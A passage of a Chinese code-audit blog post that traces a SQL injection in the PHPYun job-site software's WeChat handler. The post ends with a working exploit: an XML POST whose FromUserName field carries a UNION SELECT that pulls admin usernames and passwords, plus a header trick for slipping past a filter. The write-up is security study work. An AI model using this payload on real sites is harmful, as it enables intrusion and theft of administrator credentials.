class="keyword">elseif</span>($EventKey==<span class="string">'职位搜索'</span>)&#123;</span><br><span class="line"></span><br><span class="line">						</span><br><span class="line"></span><br><span class="line">						$centerStr = <span class="string">"&lt;Content&gt;&lt;![CDATA[直接回复城市、职位、公司名称等关键字搜索您需要的职位信息。\n 如：【经理】、【南京 经理】、【南京 xx公司】]]&gt;&lt;/Content&gt;"</span>;</span><br><span class="line"></span><br><span class="line">						$this-&gt;MsgType = <span class="string">'text'</span>;</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			  &#125;<span class="keyword">elseif</span>($MsgType==<span class="string">'text'</span>)&#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span>($keyword)&#123;</span><br><span class="line"></span><br><span class="line">					</span><br><span class="line"></span><br><span class="line">					$centerStr = $this-&gt;searchJob($keyword);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			  &#125;</span><br><span class="line"></span><br><span class="line">			 </span><br><span class="line"></span><br><span class="line">			  $topStr = sprintf($topTpl, $fromUsername, $toUsername, $times, $this-&gt;MsgType);</span><br><span class="line"></span><br><span class="line">			  <span class="keyword">echo</span> $topStr.$centerStr.$bottomStr;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>这里先判断类型，如果点击，$MsgEvent==’CLICK’ 则会调用bindUser（）方法。</p>
+<p>原本这段代码判断是否 我的帐号信息，但在环境搭建后可能是编码原因，一直复现不成功，所以这里我改成了myaccount所以才会去执行bindUser()方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($EventKey==<span class="string">'myaccount'</span>)&#123;</span><br><span class="line">                       $centerStr = $this-&gt;bindUser($fromUsername);</span><br></pre></td></tr></table></figure>
+<p>这里调用了这个bindUser()方法，所以这里跟进一下这个方法是做什么的。</p>
+<p>Code:286</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">bindUser</span><span class="params">($wxid=<span class="string">''</span>)</span></span><br><span class="line"></span><br><span class="line"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	$bindType = $this-&gt;isBind($wxid);</span><br><span class="line"></span><br><span class="line">	$this-&gt;MsgType = <span class="string">'text'</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $bindType[<span class="string">'cenetrTpl'</span>];</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将$wxid这个参数又传给了isBind()方法进行处理。</p>
+<p>继续跟进isBind()方法：</p>
+<p>Code:295</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">isBind</span><span class="params">($wxid=<span class="string">''</span>)</span></span><br><span class="line"></span><br><span class="line">	</span>&#123;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($wxid)</span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			$User = $this-&gt;obj-&gt;DB_select_once(<span class="string">"member"</span>,<span class="string">"`wxid`='"</span>.$wxid.<span class="string">"'"</span>,<span class="string">"`uid`,`username`"</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($User[<span class="string">'uid'</span>]&gt;<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			$User[<span class="string">'bindtype'</span>] = <span class="string">'1'</span>;</span><br><span class="line"></span><br><span class="line">			$User[<span class="string">'cenetrTpl'</span>] = <span class="string">"&lt;Content&gt;&lt;![CDATA[您的"</span>.iconv(<span class="string">'gbk'</span>,<span class="string">'utf-8'</span>,$this-&gt;config[<span class="string">'sy_webname'</span>]).<span class="string">"帐号："</span>.$User[<span class="string">'username'</span>].<span class="string">"已成功绑定！ \n\n\n 您也可以&lt;a href=\""</span>.$this-&gt;config[<span class="string">'sy_weburl'</span>].<span class="string">"/wap/index.php?m=login&amp;wxid="</span>.$wxid.<span class="string">"\"&gt;点击这里&lt;/a&gt;进行解绑或绑定其他帐号]]&gt;&lt;/Content&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			$Token = $this-&gt;getToken();</span><br><span class="line"></span><br><span class="line">			$Url = <span class="string">'https://api.weixin.qq.com/cgi-bin/user/info?access_token='</span>.$Token.<span class="string">'&amp;openid='</span>.$wxid.<span class="string">'&amp;lang=zh_CN'</span>;</span><br><span class="line"></span><br><span class="line">			$CurlReturn  = $this-&gt;CurlPost($Url);</span><br><span class="line"></span><br><span class="line">			$UserInfo    = json_decode($CurlReturn);</span><br><span class="line"></span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">			$wxid        = $wxid;</span><br><span class="line"></span><br><span class="line">			$wxname      = $UserInfo-&gt;nickname;</span><br><span class="line"></span><br><span class="line">			$this-&gt;config[<span class="string">'token_time'</span>] = time();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			$User[<span class="string">'cenetrTpl'</span>] = <span class="string">'&lt;Content&gt;&lt;![CDATA[您还没有绑定帐号，&lt;a href="'</span>.$this-&gt;config[<span class="string">'sy_weburl'</span>].<span class="string">'/wap/index.php?m=login&amp;wxid='</span>.$wxid.<span class="string">'"&gt;点击这里&lt;/a&gt;进行绑定!]]&gt;&lt;/Content&gt;'</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $User;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>这里传过来的$wxid直接进入到了DB_select_once方法中。 这里继续跟进DB_select_once是否有进行过滤等。如果没有过滤则存在sql注入</p>
+<p>File:/Module/class/action.class.php<br>Code:53</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DB_select_once</span><span class="params">($tablename, $where = <span class="number">1</span>, $select = <span class="string">"*"</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	$cachename=$tablename.$where;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!$return=$this-&gt;Memcache_set($cachename))&#123;</span><br><span class="line"></span><br><span class="line">		$SQL = <span class="string">"SELECT $select FROM "</span> . $this-&gt;def . $tablename . <span class="string">" WHERE $where limit 1"</span>;</span><br><span class="line"></span><br><span class="line">		$query = $this-&gt;db-&gt;query($SQL);</span><br><span class="line"></span><br><span class="line">		$return=$this-&gt;db-&gt;fetch_array($query);</span><br><span class="line"></span><br><span class="line">		$this-&gt;Memcache_set($cachename,$return);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $return;</span><br></pre></td></tr></table></figure>
+<p>所以没有过滤产生了注入工攻击</p>
+<p>漏洞利用方法：</p>
+<p><a href="http://192.168.0.108/phpyun3/weixin/index.php?m=index&amp;c=index" target="_blank" rel="external">http://192.168.0.108/phpyun3/weixin/index.php?m=index&amp;c=index</a></p>
+<p>POST:<br>&lt;?xml version=”1.0” encoding=”utf-8”?&gt;</p>
+<xml><br>  <tousername>1111</tousername><br>  <fromusername>1111’ and 1=2 union select 1,(select concat(username,password) from phpyun_admin_user limit 0,1)#</fromusername><br>  <createtime>1402550611</createtime><br>  <msgtype>event</msgtype><br>  <event>CLICK</event><br>  <eventkey>myaccount</eventkey><br>  <funcflag>0</funcflag><br></xml>
+
+<p>这里提交将会被拦</p>
+<p><img src="http://evilanne.github.io/images/img/14689231850106.jpg" alt="">￼</p>
+<p>通过tamper Data来突破<br>添加一个：Content-Type:text/xml;</p>
+<p><img src="http://evilanne.github.io/images/img/14689233427860.jpg" alt="">￼</p>
+<p><img src="http://evilanne.github.io/images/img/14689233656655.jpg" alt="">￼</p>
+<p>提交，查看源代码查看密码：</p>
+<p><img src="http://evilanne.github.io/images/img/14689233985962.jpg" alt="">￼</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/07/15/审计学习笔记一/" rel="next" title="审计学习笔记一">
+                <i class="fa fa-chevron-left"></i> 审计学习笔记一
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/07/25/小旅行/" rel="prev" title="小旅行">
+                小旅行 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/07/20/审计学习笔记二/"
+           data-title="审计学习笔记二" data-url="http://yoursite.com/2016/07/20/审计学习笔记二/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <p class="post-toc-empty">此文章未包含目录</p>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
